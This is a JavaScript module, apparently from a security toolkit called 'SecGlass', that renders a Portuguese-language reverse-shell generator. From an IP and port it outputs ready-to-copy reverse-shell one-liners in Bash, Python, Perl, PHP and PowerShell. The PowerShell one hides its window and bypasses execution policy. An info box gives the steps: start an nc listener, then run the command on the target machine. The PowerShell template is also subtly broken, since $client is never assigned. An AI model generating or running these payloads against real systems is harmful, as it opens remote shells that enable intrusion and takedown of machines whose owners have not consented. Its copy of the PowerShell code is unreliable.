(function (tool) {
    const utils = window.SecGlassUtils || {};

    function renderInterface() {
        if (utils.addFormStyles) {
            utils.addFormStyles();
        }

        tool.container.innerHTML = `
            <div class="reverseshell-tool">
                <h2 class="tool-section-header">Gerador de Reverse Shell</h2>
                <div class="secglass-form-row">
                    <div class="secglass-form-col">
                        <div class="secglass-input-group">
                            <label for="ipAddress">Endereço IP</label>
                            <input type="text" id="ipAddress" class="secglass-input" placeholder="Ex: 10.0.0.1">
                        </div>
                    </div>
                    <div class="secglass-form-col">
                        <div class="secglass-input-group">
                            <label for="port">Porta</label>
                            <input type="number" id="port" class="secglass-input" placeholder="Ex: 4444" value="4444">
                        </div>
                    </div>
                </div>

                <div class="secglass-form-group">
                    <label>Selecione o Tipo</label>
                    <div class="secglass-radio-group">
                        <label class="secglass-radio">
                            <input type="radio" name="shellType" value="bash" checked>
                            <span>Bash</span>
                        </label>
                        <label class="secglass-radio">
                            <input type="radio" name="shellType" value="python">
                            <span>Python</span>
                        </label>
                        <label class="secglass-radio">
                            <input type="radio" name="shellType" value="perl">
                            <span>Perl</span>
                        </label>
                        <label class="secglass-radio">
                            <input type="radio" name="shellType" value="php">
                            <span>PHP</span>
                        </label>
                        <label class="secglass-radio">
                            <input type="radio" name="shellType" value="powershell">
                            <span>PowerShell</span>
                        </label>
                    </div>
                </div>

                <div class="shell-output-container">
                    <div class="shell-output-header">
                        <h3>Comando</h3>
                        <button id="copyBtn" class="secglass-button secglass-button-text">
                            <i class="fas fa-copy"></i>
                            <span>Copiar</span>
                        </button>
                    </div>
                    <div class="shell-code-container">
                        <pre id="shellOutput" class="shell-output">Selecione os parâmetros acima...</pre>
                    </div>
                </div>

                <div class="secglass-info-box">
                    <div class="secglass-info-header">
                        <i class="fas fa-info-circle"></i>
                        <span>Como usar</span>
                    </div>
                    <div class="secglass-info-content">
                        <p>1. Configure seu listener (na sua máquina):</p>
                        <pre class="shell-command">nc -lvnp <span id="listenerPort">4444</span></pre>
                        <p>2. Execute o comando gerado na máquina alvo</p>
                        <p>3. Você receberá uma conexão reversa no seu listener</p>
                    </div>
                </div>
            </div>
        `;

        addToolStyles();
        setupEventListeners();
        generateShell(); // Gerar shell inicial
    }

    function addToolStyles() {
        const style = document.createElement('style');
        style.textContent = `
            .reverseshell-tool { padding: 15px; }
            .tool-section-header {
                font-size: 1.2rem;
                margin-bottom: 15px;
                background: linear-gradient(90deg, #5e35b1, #42a5f5);
                -webkit-background-clip: text;
                background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .shell-output-container { margin: 20px 0; }
            .shell-output-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 8px;
            }
            .shell-output-header h3 { font-size: 1rem; opacity: 0.8; }
            .shell-code-container {
                background: rgba(0, 0, 0, 0.3);
                border-radius: 8px;
                overflow: hidden;
                position: relative;
            }
            .shell-output {
                margin: 0;
                padding: 12px 15px;
                font-family: 'Courier New', monospace;
                font-size: 0.9rem;
                white-space: pre-wrap;
                word-break: break-all;
                color: #b3e5fc;
            }
            .secglass-info-box {
                background: rgba(66, 165, 245, 0.1);
                border-radius: 8px;
                margin-top: 20px;
            }
            .secglass-info-header {
                padding: 10px 15px;
                background: rgba(66, 165, 245, 0.2);
                font-weight: 500;
                display: flex;
                align-items: center;
                gap: 8px;
            }
            .secglass-info-header i { color: #42a5f5; }
            .secglass-info-content {
                padding: 15px;
                font-size: 0.9rem;
            }
            .secglass-info-content p {
                margin-bottom: 8px;
            }
            .shell-command {
                background: rgba(0, 0, 0, 0.3);
                padding: 6px 10px;
                border-radius: 4px;
                font-family: 'Courier New', monospace;
                margin: 8px 0;
                font-size: 0.85rem;
                color: #b3e5fc;
            }
        `;
        document.head.appendChild(style);
    }

    function setupEventListeners() {
        const ipInput = document.getElementById('ipAddress');
        const portInput = document.getElementById('port');
        const shellTypeRadios = document.querySelectorAll('input[name="shellType"]');
        const copyBtn = document.getElementById('copyBtn');

        // Gerar shell quando os parâmetros mudam
        ipInput.addEventListener('input', generateShell);
        portInput.addEventListener('input', generateShell);
        shellTypeRadios.forEach(radio => {
            radio.addEventListener('change', generateShell);
        });
        portInput.addEventListener('input', updateListenerPort);

        // Copiar comando para a área de transferência
        copyBtn.addEventListener('click', function () {
            const shellOutput = document.getElementById('shellOutput');
            if (utils.copyToClipboard) {
                utils.copyToClipboard(shellOutput.textContent);
            } else {
                navigator.clipboard.writeText(shellOutput.textContent)
                    .then(() => {
                        alert('Comando copiado para a área de transferência!');
                    })
                    .catch(err => {
                        console.error('Erro ao copiar:', err);
                        alert('Erro ao copiar texto. Veja o console para detalhes.');
                    });
            }
        });
    }

    function updateListenerPort() {
        const portInput = document.getElementById('port');
        const listenerPort = document.getElementById('listenerPort');
        listenerPort.textContent = portInput.value || "4444";
    }

    function generateShell() {
        const ip = document.getElementById('ipAddress').value.trim() || '10.0.0.1';
        const port = document.getElementById('port').value.trim() || '4444';
        const shellType = document.querySelector('input[name="shellType"]:checked')?.value || 'bash';
        let command = '';

        switch (shellType) {
            case 'bash':
                command = `bash -c 'exec bash -i &>/dev/tcp/${ip}/${port} <&1'`;
                break;
            case 'python':
                command = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
                break;
            case 'perl':
                command = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
                break;
            case 'php':
                command = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                break;
            case 'powershell':
                command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
                break;
        }

        const shellOutput = document.getElementById('shellOutput');
        shellOutput.textContent = command;
    }

    // Inicialização da ferramenta
    tool.init = function () {
        renderInterface();
    };

    // Método de limpeza ao fechar a ferramenta
    tool.cleanup = function () {
        // Limpeza adicional, se necessário
    };
})(window.SecGlassTool || {});
